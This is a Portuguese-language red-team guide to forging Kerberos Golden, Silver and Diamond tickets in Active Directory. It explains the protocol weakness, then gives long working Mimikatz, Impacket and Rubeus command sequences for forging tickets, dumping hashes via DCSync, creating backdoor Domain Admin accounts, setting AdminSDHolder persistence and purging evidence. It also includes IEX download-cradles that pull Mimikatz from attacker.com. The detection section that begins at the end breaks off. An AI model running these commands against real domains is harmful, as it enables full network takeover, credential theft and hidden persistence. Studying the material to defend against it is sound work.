---
title: "Golden & Silver Tickets"
---

# Golden Ticket, Silver Ticket e Diamond Ticket

# O que é?

Golden Ticket, Silver Ticket, e Diamond Ticket sao tres tecnicas de forjamento de tickets Kerberos. Cada uma explora o mesmo principio fundamental: o protocolo Kerberos confia em qualquer ticket que apresente uma assinatura criptograficamente valida. Se o atacante possui a chave usada para assinar o ticket, pode forjar qualquer ticket com o conteudo que quiser — incluindo grupos, permissoes, e identidades arbitrarias.

**Golden Ticket — forjamento de TGT com hash do krbtgt:**

O Golden Ticket e um TGT (Ticket Granting Ticket) forjado, assinado com o hash NT da conta `krbtgt`. O krbtgt e a conta especial do KDC — seu hash e a chave mestra do dominio, usada para assinar todos os TGTs emitidos pelo KDC. Qualquer DC do dominio aceita um TGT como valido se ele apresentar a assinatura criptografica correta do krbtgt.

O atacante com o hash do krbtgt pode criar um TGT que afirma que qualquer usuario (incluindo usuarios que nao existem) e membro de qualquer grupo (incluindo Domain Admins, Enterprise Admins). O KDC, ao receber esse TGT nos TGS-REQ subsequentes, verifica apenas a assinatura criptografica — nao consulta o AD para confirmar se o usuario existe ou se pertence aos grupos listados. A assinatura e valida, o KDC emite o TGS.

Impacto de persistencia: mesmo que todas as senhas de usuario sejam trocadas, o Golden Ticket permanece valido ate que o hash do krbtgt seja rotacionado. Como o AD suporta dois hashes do krbtgt simultaneamente (atual e anterior, para compatibilidade de replicacao entre DCs), o hash deve ser rotacionado duas vezes consecutivas para invalidar completamente um Golden Ticket existente.

**Silver Ticket — forjamento de TGS com hash da conta de servico:**

O Silver Ticket e um TGS (Ticket Granting Service) forjado, assinado diretamente com o hash NT da conta de servico alvo. Ao contrario do Golden Ticket, o Silver Ticket bypassa completamente o KDC — o atacante entrega o ticket forjado diretamente ao servico, sem nenhuma interacao com o Domain Controller.

O servico alvo recebe o AP-REQ com o Silver Ticket, tenta decifra-lo com seu proprio hash NT, e consegue — porque o ticket foi forjado com exatamente esse hash. O servico le o PAC do interior do ticket, extrai os grupos e permissoes listados, e concede acesso de acordo com o PAC forjado.

A ausencia de comunicacao com o KDC e a caracteristica mais relevante do Silver Ticket: nao gera Event 4769 (TGS-REQ) nem Event 4768 (AS-REQ) no Domain Controller. O unico rastro possivel sao eventos no proprio servidor do servico alvo.

**Diamond Ticket — modificacao de TGT legitimo:**

O Diamond Ticket é uma variação moderna que torna a forjagem menos detectável. Em vez de criar um TGT do zero (como o Golden Ticket), o Diamond Ticket:
1. Solicita um TGT legítimo ao KDC usando credenciais válidas (gera Event 4768 normal)
2. Decifra o TGT recebido usando o hash do krbtgt (que o atacante possui)
3. Modifica o PAC dentro do TGT — adiciona grupos, eleva permissões
4. Re-cifra o TGT com o hash do krbtgt
5. Usa o TGT modificado como se fosse o original

O resultado é um ticket que o KDC genuinamente emitiu (a requisição foi legítima), mas cujo conteúdo foi alterado após a emissão. O ponto crítico de detecção é que o Golden Ticket gera Event 4768 com características anômalas — campos ausentes, timestamps incoerentes, ou ausência de correlação com um AS-REQ anterior. O Diamond Ticket gera um Event 4768 completamente legítimo porque a solicitação inicial ao KDC usa credenciais válidas; a modificação do PAC ocorre inteiramente no lado do cliente após o KDC ter emitido o ticket, sem que o KDC veja a versão modificada. Soluções como Microsoft Defender for Identity detectam Golden Tickets via anomalias no fluxo de AS-REQ, mas não têm visibilidade sobre o PAC após a emissão.

**O modelo de confiança explorado:**

Todos os três ataques exploram a mesma premissa do protocolo Kerberos: a confiança é baseada exclusivamente em criptografia. Qualquer ticket que apresente a assinatura correta é aceito como válido — o KDC não mantém registro de quais tickets emitiu nem valida o PAC novamente quando o ticket é apresentado a um serviço (a menos que o serviço tenha configurado PAC validation via Netlogon, que é opcional). O protocolo não tem mecanismo nativo de revogação como PKI — um ticket emitido (ou forjado) permanece válido até sua data de expiração, a menos que o hash do krbtgt seja rotacionado. Por isso, a resposta defensiva a um Golden Ticket confirmado requer rotação dupla do krbtgt (dois resets com intervalo de 10 horas para invalidar tickets em uso).

# Onde é implementado?

O forjamento de tickets Kerberos afeta qualquer ambiente que use Active Directory com Kerberos — ou seja, qualquer ambiente Windows com dominio AD desde o Windows 2000.

**Escopo de impacto do Golden Ticket:**

- Afeta todos os DCs do dominio simultaneamente — qualquer DC aceita TGTs assinados com o krbtgt
- Persiste apos reset de senhas de todos os usuarios
- Persiste apos reboot de workstations e servidores membros
- Valido por ate 10 anos se o atacante configurar o lifetime maximo no ticket forjado
- Invalido somente apos rotacao dupla do krbtgt (com intervalo minimo de 10 horas entre as rotacoes)
- Afeta Windows Server 2003 em diante — nao ha patch que elimine a vulnerabilidade, apenas boas praticas operacionais

**Escopo de impacto do Silver Ticket:**

- Afeta servicos individuais — cada Silver Ticket e valido apenas para o SPN especifico para o qual foi forjado
- Nao precisa de conectividade com o DC durante o uso — funciona mesmo em segmentos de rede isolados
- Valido enquanto o hash da conta de servico nao for trocado
- Persiste mesmo se o usuario real associado ao servico trocar a senha (porque o ticket usa o hash da conta de servico, nao do usuario)
- Afeta todos os ambientes AD independentemente de versao do Windows Server

**Contas de servico relevantes para Silver Tickets:**

Qualquer conta com SPN registrado no AD pode ser alvo de Silver Ticket se o atacante tiver o hash NT da conta. As mais impactantes:
- Contas de computador de servidores criticos (hash rotacionado a cada 30 dias automaticamente — janela de oportunidade limitada)
- Contas de servico manuais de SQL Server, IIS, Exchange — senhas raramente rotacionadas
- Contas de servico com acesso elevado a multiplos sistemas
- DCs proprios — hash das contas de computador do DC permite Silver Tickets para LDAP, CIFS, HOST no DC

**Versoes do Windows Server afetadas:**

Todos os ambientes com Windows Server 2003 em diante sao afetados por Golden e Silver Tickets. Nao ha versao do Windows Server imune — a vulnerabilidade e intrinseca ao design do protocolo Kerberos combinado com o modelo de confianca do AD. Controles como Protected Users Security Group e Kerberos Armoring (FAST) limitam alguns vetores de ataque mas nao eliminam completamente a possibilidade de forjagem se o hash do krbtgt for comprometido.

# Como funciona de forma adequada?

Para entender por que Golden e Silver Tickets funcionam como ataques, e preciso entender o fluxo legitimo e onde o KDC realiza (ou deixa de realizar) validacoes.

**Fluxo legitimo completo: TGT → TGS → Acesso ao Servico:**

```
    Alice               KDC                   File Server
      |                  |                         |
      | 1. AS-REQ        |                         |
      |----------------->|                         |
      |  (com pre-auth)  |                         |
      |                  | KDC verifica:           |
      |                  | - Alice existe no AD?   |
      |                  | - Pre-auth valida?      |
      |                  | - Conta ativa?          |
      |                  |                         |
      | 2. AS-REP        |                         |
      |<-----------------|                         |
      |  TGT cifrado     |                         |
      |  com hash krbtgt |                         |
      |                  |                         |
      | 3. TGS-REQ       |                         |
      |----------------->|                         |
      |  TGT + SPN       |                         |
      |  CIFS/fileserver |                         |
      |                  | KDC verifica:           |
      |                  | - TGT: assinatura OK?   |
      |                  | - Autenticador valido?  |
      |                  | - SPN existe no AD?     |
      |                  | - Qual conta tem SPN?   |
      |                  | (NAO verifica permissao)|
      |                  |                         |
      | 4. TGS-REP       |                         |
      |<-----------------|                         |
      |  TGS cifrado com |                         |
      |  hash da conta   |                         |
      |  do FileServer   |                         |
      |                  |                         |
      | 5. AP-REQ        |                         |
      |------------------------------------>|       |
      |  TGS + autenticador               |       |
      |                                   | Srv:  |
      |                                   | Decifra TGS
      |                                   | com proprio hash
      |                                   | Le PAC
      |                                   | Verifica permissao
      |                                   | Concede acesso
      | 6. AP-REP        |                |       |
      |<------------------------------------|       |
```

**Como o KDC valida tickets — e onde para:**

Para TGTs (apresentados no TGS-REQ):
- Decifra o TGT com o hash do krbtgt — se conseguir decifrar, a assinatura e valida
- Extrai a Session Key do interior do TGT
- Usa a Session Key para decifrar o autenticador enviado pelo cliente
- Valida o timestamp do autenticador (anti-replay)
- Le o PAC do interior do TGT — mas NAO consulta o AD para confirmar se os SIDs/grupos do PAC sao reais
- Emite o TGS com base no PAC que veio do TGT

Para TGSs (apresentados no AP-REQ ao servico):
- O servico decifra o TGS com seu proprio hash NT
- Le o PAC do interior
- Opcionalmente (e raramente na pratica) contacta o KDC via Netlogon para validar o PAC
- Na maioria dos casos, confia no PAC como esta e concede acesso baseado nos SIDs listados

**O que contem o PAC — e por que sua integridade importa:**

```
PAC (Privilege Attribute Certificate)
+-- LOGON_INFO
|   +-- LogonTime, LogoffTime, PasswordLastSet
|   +-- EffectiveName (sAMAccountName)
|   +-- UserId (RID do usuario — ex: 1105)
|   +-- PrimaryGroupId (RID do grupo primario — ex: 513)
|   +-- GroupCount + GroupIds[]
|   |   +-- 513 (Domain Users)
|   |   +-- 512 (Domain Admins) <- atacante adiciona este
|   |   +-- 519 (Enterprise Admins) <- e este
|   +-- LogonDomainId (Domain SID: S-1-5-21-...)
|   +-- ExtraSids[] <- SIDs de outros dominios (cross-domain)
+-- CLIENT_INFO
|   +-- ClientId (timestamp de autenticacao)
|   +-- Name (nome do cliente)
+-- UPN_DNS_INFO
|   +-- UPN (alice@corp.local)
|   +-- DnsDomainName (CORP.LOCAL)
+-- SERVER_CHECKSUM  <- HMAC assinado com hash da conta de servico
+-- KDC_CHECKSUM    <- HMAC assinado com hash do krbtgt
```

O KDC_CHECKSUM e o SERVER_CHECKSUM protegem o PAC contra modificacao. Um Silver Ticket forjado tem um SERVER_CHECKSUM valido (o atacante tem o hash da conta de servico para gerar esse checksum), mas o KDC_CHECKSUM e invalido (o atacante precisaria do hash do krbtgt para gerar). Porem, como a maioria dos servicos Windows verifica apenas o SERVER_CHECKSUM com sua propria chave — e nao o KDC_CHECKSUM — o Silver Ticket e aceito.

**Por que a integridade do krbtgt e fundamental para a seguranca do dominio:**

O hash do krbtgt e a raiz de confianca de todo o modelo Kerberos do dominio. Qualquer ticket apresentado ao dominio — seja para acesso a file shares, email, banco de dados, ou ao proprio DC — e validado de forma encadeada ate o krbtgt. Um atacante com esse hash pode criar qualquer identidade, qualquer permissao, para qualquer servico, durante o tempo que o hash permanecer o mesmo. Por isso o krbtgt e chamado de "o segredo mais critico do dominio" e a conta de servico mais protegida no AD.

---

## O krbtgt e a Forja de Tickets

### O que é o krbtgt e por que é crítico

A conta `krbtgt` é uma conta de serviço especial que existe em todo domínio Active Directory. É a conta do Key Distribution Center (KDC) — o serviço que assina e valida todos os TGTs do domínio. O nome vem de "Kerberos ticket granting ticket".

Características únicas do krbtgt:
- Nunca faz login interativo
- Tem duas senhas rotacionadas automaticamente (hash atual e anterior) para suportar replicação entre DCs
- Quando seu hash NTLM é comprometido, o atacante pode forjar TGTs que qualquer DC do domínio aceitará como legítimos
- Por padrão, sua senha **nunca é rotacionada automaticamente** pelo sistema — apenas manualmente por administradores
- Para eliminar a ameaça de Golden Ticket, o hash deve ser rotacionado **duas vezes**, porque o DC aceita tickets assinados tanto com a senha atual quanto com a anterior

### Estrutura de um TGT e o PAC

Um TGT Kerberos contém:
1. **Header criptografado** com a chave do krbtgt (etype escolhido — RC4 ou AES)
2. **Authorization Data** — inclui o **PAC (Privilege Attribute Certificate)**

O PAC contém:
- Grupos do usuário (RIDs dos grupos)
- User ID (RID)
- Domain SID
- Logon info (nome, horário, etc.)
- **Duas assinaturas**: uma com a chave do krbtgt (KDC signature) e outra com a chave do serviço alvo (Server signature)

O Golden Ticket forja o PAC inteiro, incluindo os grupos. O atacante pode incluir quaisquer grupos — incluindo Domain Admins (RID 512), Enterprise Admins (RID 519), Schema Admins (RID 518) — mesmo que o usuário não seja membro deles.

### Fluxo do Golden Ticket

```
Atacante (com krbtgt hash) → [Mimikatz/ticketer.py] → Forja TGT com PAC customizado
                                                              ↓
TGT forjado apresentado ao KDC via TGS-REQ → KDC valida assinatura do krbtgt (válida!)
                                                              ↓
KDC retorna TGS legítimo baseado no PAC forjado → Atacante apresenta ao serviço
                                                              ↓
Serviço concede acesso como se fosse Domain Admin
```

**Ponto crítico**: O KDC verifica apenas a assinatura criptográfica do TGT. Não verifica se o usuário existe no AD, se está desabilitado, ou se realmente pertence aos grupos listados no PAC.

### Fluxo do Silver Ticket

```
Atacante (com hash do service account) → [Mimikatz] → Forja TGS diretamente
                                                              ↓
TGS forjado apresentado diretamente ao serviço alvo (sem passar pelo KDC!)
                                                              ↓
Serviço decripta com sua própria chave (válida!) → Concede acesso baseado no PAC
```

**Porque o KDC não está envolvido:**
- Não gera evento 4769 no DC (nenhuma requisição TGS)
- Não gera evento 4768 no DC (nenhuma requisição TGT)
- O único log seria no próprio servidor do serviço alvo
- Muito mais furtivo que Golden Ticket para uso operacional

**Limitação do Silver Ticket**: válido apenas para o serviço/SPN específico para o qual foi forjado. Para acesso a múltiplos serviços, precisaria de múltiplos Silver Tickets ou usar um Golden Ticket.

### PAC Verification — Por que Silver Ticket funciona

Existe um mecanismo chamado PAC Verification onde o serviço pode contatar o DC para validar o PAC do ticket apresentado. Isso **eliminaria** Silver Tickets se fosse universalmente implementado. Porém:

1. **Por padrão, PAC Verification está desabilitado** na maioria dos serviços Windows
2. Quando habilitado, adiciona latência — muitas organizações desativam por performance
3. Serviços como IIS, SQL Server, File Sharing raramente implementam verificação de PAC
4. A flag `ValidateKdcPacSignature` no registry controla isso, e raramente é configurada

### Extra SIDs — Escalação Cross-Domain com Golden Ticket

Active Directory permite **trusts entre domínios e florestas**. Quando um trust existe, tickets de um domínio podem ser usados para acessar recursos em outro. O mecanismo usa **SIDs extras no PAC**.

Com Golden Ticket, o atacante pode incluir SIDs externos no campo `ExtraSids` do PAC:
- `S-1-5-21-ROOTDOMAIN-519` → Enterprise Admins do root domain da floresta
- `S-1-5-21-ROOTDOMAIN-512` → Domain Admins do root domain

Se não há **SID Filtering** configurado no trust, o domínio de destino aceita esses SIDs externos e concede o acesso correspondente. Isso permite escalação de um child domain para o root domain — comprometendo a floresta inteira.

---

## Na Prática

### Pré-requisitos e Onde Obter o Hash do krbtgt

**O que você precisa para Golden Ticket:**
1. Hash NTLM do `krbtgt` (obtido por DCSync, NTDS.dit dump, ou dump de LSASS no DC)
2. Domain SID (obtido por qualquer usuário de domínio)
3. Nome do domínio
4. Um nome de usuário (pode ser qualquer string — até fictício)

**Obter Domain SID (qualquer usuário autenticado):**
```powershell
# PowerShell nativo
(Get-ADDomain).DomainSID.Value

# Com PowerView
Get-DomainSID

# Com whoami
whoami /user
# Output: DOMAIN\user S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX-YYYY
# O SID do domínio é tudo exceto o último número (RID)

# Via wmic
wmic useraccount where name='Administrator' get sid
# Remover os últimos 4 dígitos após o último hífen = Domain SID
```

**Obter krbtgt hash (requer DA ou DCSync privileges):**
```
# Via DCSync (ver 04_dcsync_e_dominancia.md)
lsadump::dcsync /user:domain\krbtgt

# Output relevante:
# Object RDN: krbtgt
# ** SAM ACCOUNT **
# SAM Username         : krbtgt
# Hash NTLM: aabbccddeeff00112233445566778899  ← esse é o hash
# Hash NTLM- previous: ...                      ← hash anterior (ainda válido)
```

### Quando Usar Golden vs Silver vs Diamond

| Situação | Recomendação | Motivo |
|---|---|---|
| Persistência longa após DA | Golden Ticket | Persiste até 2x rotação de krbtgt |
| Acesso furtivo a serviço específico | Silver Ticket | Não passa pelo KDC |
| Ambiente com Defender for Identity | Diamond Ticket | O KDC vê a requisição legítima |
| Cross-domain escalation | Golden Ticket + Extra SIDs | Único método que suporta SIDs externos |
| Acesso SQL sem conta de SA | Silver Ticket (MSSQL SPN) | Direto ao serviço |
| Acesso a file shares de servidor específico | Silver Ticket (CIFS SPN) | Furtivo, sem contato com DC |

---

## Exemplos de Código / Comandos

### Golden Ticket — Mimikatz (Windows)

```powershell
# Passo 1: Carregar Mimikatz (várias opções)
# Opção A: Executável direto
.\mimikatz.exe

# Opção B: Em memória via PowerShell (evita escrita em disco)
$url = "http://attacker.com/mimikatz.exe"
$bytes = (New-Object Net.WebClient).DownloadData($url)
[Reflection.Assembly]::Load($bytes)

# Opção C: Invoke-Mimikatz (PowerSploit)
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-Mimikatz.ps1')

# ================================================================
# Passo 2: Verificar privilégios (precisa de SYSTEM ou debug)
privilege::debug
# Output esperado: Privilege '20' OK

# ================================================================
# Passo 3: Criar Golden Ticket

# Parâmetros obrigatórios:
# /user: nome do usuário a impersonar (pode ser fictício)
# /domain: FQDN do domínio
# /sid: SID do domínio (sem o RID final)
# /krbtgt: hash NTLM do krbtgt

# Criação básica — ticket salvo em arquivo
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:aabbccddeeff00112233445566778899 /ticket:golden.kirbi

# Com opções avançadas
kerberos::golden \
    /user:FakeAdmin \
    /domain:corp.local \
    /sid:S-1-5-21-1234567890-1234567890-1234567890 \
    /krbtgt:aabbccddeeff00112233445566778899 \
    /id:500 \
    /groups:512,513,518,519,520 \
    /startoffset:-10 \
    /endsfor:600 \
    /renewmax:10080 \
    /ticket:golden_advanced.kirbi

# Parâmetros explicados:
# /id:500           → RID do usuário no PAC (500 = Administrator)
# /groups:          → RIDs dos grupos no PAC:
#                     512 = Domain Admins
#                     513 = Domain Users
#                     518 = Schema Admins
#                     519 = Enterprise Admins
#                     520 = Group Policy Creator Owners
# /startoffset:-10  → Ticket "começou" 10 minutos atrás (evita suspeita de ticket recém-criado)
# /endsfor:600      → Válido por 600 minutos (10 horas) — padrão do AD
# /renewmax:10080   → Renovável por até 10080 minutos (7 dias) — padrão do AD

# Golden Ticket com Extra SIDs (cross-domain escalation)
kerberos::golden \
    /user:Administrator \
    /domain:child.corp.local \
    /sid:S-1-5-21-CHILD-DOMAIN-SID \
    /krbtgt:CHILD_KRBTGT_HASH \
    /sids:S-1-5-21-ROOT-DOMAIN-SID-519 \
    /ticket:golden_crossdomain.kirbi

# /sids: SID extra a incluir no PAC — aqui Enterprise Admins do root domain
# Requer que o trust não tenha SID Filtering habilitado

# Injetar ticket na sessão atual (Pass-the-Ticket)
kerberos::ptt golden.kirbi

# Verificar tickets na sessão
kerberos::list

# ================================================================
# Passo 4: Usar o ticket

# Listar arquivos no DC
dir \\DC01.corp.local\C$

# Executar comando remoto
psexec.exe \\DC01.corp.local cmd

# Abrir sessão interativa
Enter-PSSession -ComputerName DC01.corp.local

# Adicionar usuário como Domain Admin
net group "Domain Admins" backdoor_user /add /domain

# Dump de hashes (DCSync via Golden Ticket)
lsadump::dcsync /domain:corp.local /all /csv
```

---

### Golden Ticket — Impacket/ticketer.py (Linux)

```bash
# Criar Golden Ticket (salva como Administrator.ccache)
ticketer.py \
    -nthash aabbccddeeff00112233445566778899 \
    -domain-sid S-1-5-21-1234567890-1234567890-1234567890 \
    -domain corp.local \
    -duration 3650 \
    Administrator

# Parâmetros:
# -nthash: hash NTLM do krbtgt
# -domain-sid: SID do domínio
# -domain: FQDN do domínio
# -duration: duração em dias (3650 = ~10 anos — uso em labs)
# Administrator: nome do usuário a impersonar

# Com grupos extras no PAC
ticketer.py \
    -nthash aabbccddeeff00112233445566778899\
    -domain-sid S-1-5-21-1234567890-1234567890-1234567890 \
    -domain corp.local \
    -groups 512,513,518,519,520 \
    -user-id 500 \
    -duration 365 \
    Administrator

# Com Extra SIDs para cross-domain
ticketer.py \
    -nthash CHILD_KRBTGT_HASH \
    -domain-sid S-1-5-21-CHILD-SID \
    -domain child.corp.local \
    -extra-sid S-1-5-21-ROOT-SID-519 \
    -duration 365 \
    Administrator

# Exportar variável de ambiente para usar o ticket
export KRB5CCNAME=/tmp/Administrator.ccache

# Verificar ticket
klist

# Usar ticket com ferramentas Impacket
# PsExec remoto
psexec.py -k -no-pass corp.local/Administrator@DC01.corp.local

# Secretsdump via Golden Ticket
secretsdump.py -k -no-pass -just-dc-ntlm corp.local/Administrator@DC01.corp.local

# WMI exec
wmiexec.py -k -no-pass corp.local/Administrator@servidor.corp.local

# SMB com smbclient
smbclient.py -k -no-pass corp.local/Administrator@DC01.corp.local

# Listar shares
smbclient //DC01.corp.local/C$ -k --no-pass

# Verificar acesso
crackmapexec smb DC01.corp.local -k --use-kcache
```

---

### Silver Ticket — Mimikatz (Windows)

```powershell
# Silver Ticket requer hash do SERVICE ACCOUNT (não krbtgt)
# Obtido via: Kerberoasting, DCSync, LSASS dump, etc.

# ================================================================
# Silver Ticket para CIFS (acesso a file shares)
kerberos::golden \
    /user:Administrator \
    /domain:corp.local \
    /sid:S-1-5-21-1234567890-1234567890-1234567890 \
    /target:SERVIDOR01.corp.local \
    /service:cifs \
    /rc4:SERVICE_ACCOUNT_NTLM_HASH \
    /ptt

# /target: FQDN ou NetBIOS do servidor (não o DC, o servidor do serviço!)
# /service: tipo do SPN (cifs, http, host, ldap, mssqlsvc, etc.)
# /rc4: hash NTLM do service account (ou /aes256: para AES)
# /ptt: injetar diretamente (sem salvar em arquivo)

# Após /ptt — acessar o serviço diretamente:
dir \\SERVIDOR01.corp.local\C$
dir \\SERVIDOR01.corp.local\ADMIN$
dir \\SERVIDOR01.corp.local\D$

# ================================================================
# Silver Ticket para HTTP (impersonation em web apps com Kerberos)
kerberos::golden \
    /user:Administrator \
    /domain:corp.local \
    /sid:S-1-5-21-1234567890-1234567890-1234567890 \
    /target:WEBSERVER01.corp.local \
    /service:http \
    /rc4:IIS_APPPOOL_HASH \
    /ptt

# ================================================================
# Silver Ticket para HOST (WMI, Task Scheduler, RPC)
kerberos::golden \
    /user:Administrator \
    /domain:corp.local \
    /sid:S-1-5-21-1234567890-1234567890-1234567890 \
    /target:SERVIDOR01.corp.local \
    /service:host \
    /rc4:COMPUTER_ACCOUNT_HASH \
    /ptt

# Com HOST SPN — executar via WMI
wmic /node:SERVIDOR01.corp.local process call create "cmd.exe /c whoami > C:\output.txt"

# Com HOST SPN — criar scheduled task
schtasks /create /s SERVIDOR01.corp.local /tn "Task" /tr "cmd /c net user hacker P@ss123 /add" /sc once /st 00:00

# ================================================================
# Silver Ticket para LDAP (queries LDAP como outro usuário)
kerberos::golden \
    /user:Administrator \
    /domain:corp.local \
    /sid:S-1-5-21-1234567890-1234567890-1234567890 \
    /target:DC01.corp.local \
    /service:ldap \
    /rc4:DC_MACHINE_ACCOUNT_HASH \
    /ptt

# Com LDAP Silver Ticket — fazer DCSync!
lsadump::dcsync /user:corp\krbtgt /domain:corp.local

# ================================================================
# Silver Ticket para MSSQL (SQL Server)
kerberos::golden \
    /user:sqladmin \
    /domain:corp.local \
    /sid:S-1-5-21-1234567890-1234567890-1234567890 \
    /target:SQLSERVER01.corp.local \
    /service:MSSQLSvc \
    /rc4:SQL_SERVICE_ACCOUNT_HASH \
    /ptt

# Após injetar — conectar ao SQL Server como sqladmin
Invoke-Sqlcmd -ServerInstance "SQLSERVER01.corp.local" -Query "SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin')"

# ================================================================
# Silver Ticket — salvar em arquivo para uso posterior
kerberos::golden \
    /user:Administrator \
    /domain:corp.local \
    /sid:S-1-5-21-1234567890-1234567890-1234567890 \
    /target:SERVIDOR01.corp.local \
    /service:cifs \
    /rc4:SERVICE_HASH \
    /ticket:silver_cifs_servidor01.kirbi

# Carregar depois
kerberos::ptt silver_cifs_servidor01.kirbi
```

---

### Silver Ticket — Impacket/ticketer.py (Linux)

```bash
# Silver Ticket para CIFS
ticketer.py \
    -nthash SERVICE_ACCOUNT_NTLM_HASH \
    -domain-sid S-1-5-21-1234567890-1234567890-1234567890 \
    -domain corp.local \
    -spn cifs/SERVIDOR01.corp.local \
    Administrator

# O arquivo salvo será: Administrator.ccache

# Usar ticket
export KRB5CCNAME=/tmp/Administrator.ccache

# Listar arquivos via SMB
smbclient //SERVIDOR01.corp.local/C$ -k --no-pass
ls

# Silver Ticket para HTTP
ticketer.py \
    -nthash IIS_ACCOUNT_HASH \
    -domain-sid S-1-5-21-1234567890-1234567890-1234567890 \
    -domain corp.local \
    -spn http/WEBSERVER01.corp.local \
    Administrator

# Silver Ticket para MSSQL
ticketer.py \
    -nthash SQL_SERVICE_HASH \
    -domain-sid S-1-5-21-1234567890-1234567890-1234567890 \
    -domain corp.local \
    -spn MSSQLSvc/SQLSERVER01.corp.local:1433 \
    Administrator

export KRB5CCNAME=/tmp/Administrator.ccache

# Conectar ao SQL Server
mssqlclient.py -k -no-pass corp.local/Administrator@SQLSERVER01.corp.local

# Silver Ticket para LDAP (DCSync cross-platform)
ticketer.py \
    -nthash DC_MACHINE_ACCOUNT_HASH \
    -domain-sid S-1-5-21-1234567890-1234567890-1234567890 \
    -domain corp.local \
    -spn ldap/DC01.corp.local \
    Administrator

export KRB5CCNAME=/tmp/Administrator.ccache

secretsdump.py -k -no-pass -just-dc-ntlm corp.local/Administrator@DC01.corp.local
```

---

### SPNs Comuns — Referência Rápida

```
SPN               | Serviço                    | O que permite
------------------|----------------------------|------------------------------------------
cifs/server       | File sharing (SMB)         | dir \\server\C$, copiar arquivos, psexec
http/server       | IIS / Web Apps Kerberos    | Autenticação HTTP como usuário forjado
host/server       | Host genérico Windows      | WMI, Task Scheduler, RPC, PowerShell
ldap/dc           | Active Directory LDAP      | Queries LDAP, DCSync com LDAP SPN
gc/dc             | Global Catalog             | Queries no GC (porta 3268)
MSSQLSvc/srv:port | SQL Server                 | Autenticação SQL como usuário forjado
TERMSRV/server    | Terminal Services / RDP    | Sessão RDP como usuário forjado
RestrictedKrbHost | Kerberos host restrito      | Acesso limitado via Kerberos
E3514235-.../GUID | Replicação de diretório    | DCSync com SPN de replicação
```

---

### Diamond Ticket — Conceito e Execução

```powershell
# Diamond Ticket com Rubeus — processo:
# 1. Rubeus solicita TGT legítimo ao KDC (gera evento 4768 normal)
# 2. Rubeus descriptografa o TGT usando o hash do krbtgt
# 3. Modifica o PAC (adiciona grupos, muda RID, etc.)
# 4. Recripta com o hash do krbtgt
# 5. Resultado: ticket que o KDC genuinamente emitiu, mas com PAC modificado

# Rubeus Diamond Ticket
Rubeus.exe diamond \
    /krbkey:KRBTGT_AES256_KEY \
    /user:baixo_privilegio \
    /password:senha_do_usuario \
    /enctype:aes \
    /ticketuser:Administrator \
    /ticketuserid:500 \
    /groups:512,518,519,520 \
    /dc:DC01.corp.local \
    /domain:corp.local \
    /ptt

# Parâmetros:
# /krbkey: chave AES256 do krbtgt (mais furtivo que RC4)
# /user + /password: credenciais do usuário legítimo (para obter TGT real)
# /enctype:aes: forçar AES (mais difícil de detectar que RC4)
# /ticketuser: usuário a impersonar no PAC modificado
# /ticketuserid: RID do usuário impersonado
# /groups: grupos a incluir no PAC modificado
# /ptt: injetar diretamente

# Verificar ticket injetado
Rubeus.exe describe /ticket:[base64_do_ticket]

# Por que é mais furtivo:
# - Event 4768 aparece com o usuário REAL (baixo_privilegio) — parece legítimo
# - O ticket foi realmente emitido pelo KDC — passou pela verificação
# - A modificação do PAC é post-issuance — não detectada pelo KDC
# - Soluções como Microsoft Defender for Identity são mais propensas
#   a detectar Golden Tickets (tickets que o KDC nunca emitiu) do que
#   Diamond Tickets (tickets que o KDC emitiu mas tiveram PAC modificado)

# Para obter AES256 key do krbtgt (ao invés de apenas NTLM):
# Via DCSync com Mimikatz:
lsadump::dcsync /user:domain\krbtgt /domain:corp.local
# Output mostra:
# * Primary:Kerberos-Newer-Keys *
#     Default Salt : CORP.LOCALkrbtgt
#     Default Iterations : 4096
#     Credentials
#       aes256_hmac       (4096) : [AES256 KEY AQUI]
#       aes128_hmac       (4096) : [AES128 KEY AQUI]
#       des_cbc_md5       (4096) : ...
```

---

### Operações Pós-Golden Ticket

```powershell
# ===== APÓS INJETAR GOLDEN TICKET =====

# Verificar tickets na sessão
klist
# Deve mostrar: krbtgt/corp.local@corp.local com lifetime customizado

# Enumerar DCs
nltest /dclist:corp.local

# Acessar qualquer host do domínio
dir \\qualquer-host.corp.local\C$

# Executar remotamente
Invoke-Command -ComputerName DC01.corp.local -ScriptBlock { whoami; hostname }

# Adicionar usuário backdoor como Domain Admin
net group "Domain Admins" backdoor /add /domain

# Criar objeto no AD (persistência via AdminSDHolder)
Add-DomainObjectAcl \
    -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" \
    -PrincipalIdentity backdoor \
    -Rights All \
    -Domain corp.local

# DCSync para obter todos os hashes
lsadump::dcsync /domain:corp.local /all /csv > C:\temp\all_hashes.csv

# Criar nova conta krbtgt de backup (técnica avançada de persistência)
# Clonar SID do krbtgt para conta controlada pelo atacante

# Exportar todos os tickets da sessão
kerberos::list /export

# ===== LIMPEZA (para reduzir evidências) =====
# Remover tickets da sessão
kerberos::purge

# Purge seletivo
klist purge
```

---

### Converter e Usar Tickets Entre Formatos

```bash
# Converter .kirbi (Windows) para .ccache (Linux)
# Método 1: Impacket ticketConverter
ticketConverter.py golden.kirbi golden.ccache

# Método 2: Via Rubeus (exportar como base64)
# No Windows:
Rubeus.exe tgtdeleg /nowrap
# Copiar o base64 e converter no Linux:
echo "BASE64_TICKET" | base64 -d > ticket.kirbi
ticketConverter.py ticket.kirbi ticket.ccache

# Converter .ccache para .kirbi
ticketConverter.py ticket.ccache ticket.kirbi

# Usar .ccache no Linux
export KRB5CCNAME=/tmp/golden.ccache
klist

# Injetar .kirbi no Windows
kerberos::ptt golden.kirbi
# Ou via Rubeus:
Rubeus.exe ptt /ticket:golden.kirbi
```

---

## Detecção e OPSEC

### Detecção de Golden Ticket

**Indicadores no Event Log (Event 4768 e 4769)**:
```
Event ID: 4768 (TGT Request)
- Ticket lifetime suspeito: padrão do AD é 10h (600 min) — tickets com 10 anos chamam atenção
- Username que não existe no AD (usuário fictício usado no Golden Ticket)
- Encryption Type: 0x17 (RC4) quando o usuário/DC normalmente usa AES — indica possível forjamento
- Source IP: IP inesperado para o usuário

Event ID: 4769 (TGS Request)
- Baseado no TGT forjado — pode parecer normal se o username existir
- Comparar o Username com o Username do 4768 anterior — inconsistências são suspeitas
```

**Microsoft Defender for Identity (anteriormente ATA)**:
